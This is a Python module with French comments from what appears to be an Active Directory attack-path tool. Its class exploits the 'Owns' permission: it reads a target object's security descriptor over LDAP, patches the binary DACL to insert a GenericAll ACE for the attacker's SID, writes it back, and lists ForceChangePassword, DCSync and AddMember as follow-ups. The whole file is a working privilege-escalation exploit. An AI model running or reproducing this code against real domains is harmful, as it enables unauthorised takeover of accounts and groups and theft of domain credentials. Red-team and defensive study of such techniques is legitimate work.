# strategies/ownsStrategy.py
import logging
import struct
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
from ldap3 import MODIFY_REPLACE

from entities.edge import Edge
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind

logger = logging.getLogger(__name__)


class OwnsStrategy:
    """
    Exploite la permission Owns sur un objet AD.

    Principe :
        Être propriétaire (Owner) d'un objet AD donne implicitement
        le droit de modifier son Security Descriptor, notamment :
        - Changer le propriétaire (WriteOwner)
        - Modifier la DACL (WriteDACL)
        - S'accorder GenericAll

    Chaîne d'attaque :
        Owns → setOwner(source) → addGenericAll → contrôle total

    Note :
        Owns est techniquement identique à WriteOwner en termes
        d'exploitation — la différence est que Owns signifie qu'on
        EST déjà le propriétaire, donc on n'a pas besoin de changer
        le owner, on peut directement modifier la DACL.
    """

    SD_FLAGS_OID = "1.2.840.113556.1.4.801"
    GENERIC_ALL  = 0x10000000

    def __init__(self, client_entity, target_dn_override: str = None):
        self.client             = client_entity
        self.target_dn_override = target_dn_override

    # ------------------------------------------------------------------ #
    #  Point d'entrée principal                                           #
    # ------------------------------------------------------------------ #

    def exploit(self, edge: Edge) -> ExploitResult:
        """
        Étapes :
            1. Lire le SD complet de la cible
            2. Injecter un ACE GenericAll pour le compte source
            3. Réécrire le SD modifié
        """
        if edge.kind != EdgeKind.OWNS:
            return ExploitResult(
                technique="Owns",
                edge=edge,
                success=False,
                notes=f"Edge invalide : attendu OWNS, reçu {edge.kind}"
            )

        # Utiliser le DN overridé si fourni, sinon celui du node
        target_dn  = self.target_dn_override or edge.goal_node.distinguished_name
        source_sid = edge.source_node.objectid

        logger.info(f"[Owns] {edge.source_node.label} → {edge.goal_node.label}")

        try:
            # 1. Lire le SD complet (Owner + Group + DACL)
            raw_sd = self._fetch_security_descriptor(target_dn)

            # 2. Injecter un ACE GenericAll dans la DACL
            new_sd = self._inject_generic_all(raw_sd, source_sid)

            # 3. Réécrire le SD modifié
            self._write_security_descriptor(target_dn, new_sd)

            logger.info(f"[Owns] ✅ GenericAll accordé sur {edge.goal_node.label}")

            return ExploitResult(
                technique="Owns",
                edge=edge,
                success=True,
                notes=(
                    f"ACE GenericAll ajouté sur '{edge.goal_node.label}' "
                    f"pour '{edge.source_node.label}' ({source_sid})"
                ),
                next_steps=["ForceChangePassword", "DCSync", "AddMember"]
            )

        except PermissionError as e:
            return self._fail(edge, f"Droits insuffisants : {e}")
        except Exception as e:
            logger.exception("[Owns] Erreur inattendue")
            return self._fail(edge, str(e))

    # ------------------------------------------------------------------ #
    #  Helpers privés                                                     #
    # ------------------------------------------------------------------ #

    def _fetch_security_descriptor(self, target_dn: str) -> bytes:
        """
        Récupère le SD complet (Owner + Group + DACL) avec flag 0x07.
        On a besoin du SD complet pour le réécrire correctement.
        """
        conn = self.client.ldap_connection
        conn.search(
            search_base=target_dn,
            search_filter="(objectClass=*)",
            attributes=["nTSecurityDescriptor"],
            controls=[(self.SD_FLAGS_OID, True, b"\x30\x03\x02\x01\x07")]
        )
        if not conn.entries:
            raise ValueError(f"Objet introuvable : {target_dn}")

        raw = conn.entries[0]["nTSecurityDescriptor"].raw_values
        if not raw:
            raise ValueError(f"nTSecurityDescriptor vide pour {target_dn}")

        logger.debug(f"[Owns] SD récupéré : {len(raw[0])} octets")
        return bytes(raw[0])

    def _inject_generic_all(self, raw_sd: bytes, trustee_sid: str) -> bytes:
        """
        Insère un ACE GenericAll pour trustee_sid dans la DACL.
        Patch in-place pour préserver le Control word exact du SD.
        """
        # Lire les offsets depuis le header SD
        off_own  = struct.unpack_from("<I", raw_sd, 4)[0]
        off_grp  = struct.unpack_from("<I", raw_sd, 8)[0]
        off_sacl = struct.unpack_from("<I", raw_sd, 12)[0]
        off_dacl = struct.unpack_from("<I", raw_sd, 16)[0]

        logger.debug(
            f"[Owns] Offsets — Owner:{off_own} Group:{off_grp} "
            f"Sacl:{off_sacl} Dacl:{off_dacl}"
        )

        # Lire les infos de la DACL existante
        old_acl_rev   = raw_sd[off_dacl]
        old_ace_count = struct.unpack_from("<H", raw_sd, off_dacl + 4)[0]

        # Construire le SID du trustee
        sid = LDAP_SID()
        sid.fromCanonical(trustee_sid)
        sid_bytes = sid.getData()

        # Construire l'ACE GenericAll en bytes bruts
        # Structure : AceType(1) + AceFlags(1) + AceSize(2) + Mask(4) + Sid(var)
        ace_size  = 4 + 4 + len(sid_bytes)
        ace_bytes = struct.pack("<BBH", 0x00, 0x00, ace_size)
        ace_bytes += struct.pack("<I", self.GENERIC_ALL)
        ace_bytes += sid_bytes

        # Extraire les ACEs existants et le suffix Owner/Group
        part_aces_orig = raw_sd[off_dacl + 8 : off_own]  # ACEs existants
        part_suffix    = raw_sd[off_own:]                  # Owner + Group

        # Reconstruire la DACL avec notre ACE en tête
        new_aces      = ace_bytes + part_aces_orig
        new_ace_count = old_ace_count + 1
        new_acl_size  = 8 + len(new_aces)
        new_dacl      = struct.pack(
            "<BBHHH", old_acl_rev, 0, new_acl_size, new_ace_count, 0
        )
        new_dacl += new_aces

        # Calculer le delta pour mettre à jour les offsets
        delta = len(new_dacl) - (off_own - off_dacl)

        # Assembler le nouveau SD
        new_body = raw_sd[:off_dacl] + new_dacl + part_suffix

        # Patcher les offsets in-place via bytearray
        # (préserve le Control word — leçon apprise avec WriteDacl)
        new_sd = bytearray(new_body)
        struct.pack_into("<I", new_sd, 4,  off_own  + delta)
        struct.pack_into("<I", new_sd, 8,  off_grp  + delta)
        if off_sacl != 0:
            struct.pack_into("<I", new_sd, 12, off_sacl + delta)

        logger.debug(
            f"[Owns] Nouveau SD : {len(new_sd)} octets, "
            f"AceCount={new_ace_count}"
        )
        return bytes(new_sd)

    def _write_security_descriptor(self, target_dn: str, sd_bytes: bytes) -> None:
        """Réécrit le nTSecurityDescriptor modifié sur l'objet cible."""
        conn = self.client.ldap_connection

        result = conn.modify(
            dn=target_dn,
            changes={"nTSecurityDescriptor": [(MODIFY_REPLACE, [sd_bytes])]}
        )

        logger.debug(f"[Owns] LDAP result : {conn.result}")

        if not result:
            desc = conn.result.get("description", "?")
            msg  = conn.result.get("message", "")
            diag = conn.result.get("diagnosticMessage", "")
            raise PermissionError(f"{desc} | {msg} | {diag}")

    @staticmethod
    def _fail(edge: Edge, reason: str) -> ExploitResult:
        logger.warning(f"[Owns] ❌ {reason}")
        return ExploitResult(
            technique="Owns",
            edge=edge,
            success=False,
            notes=reason
        )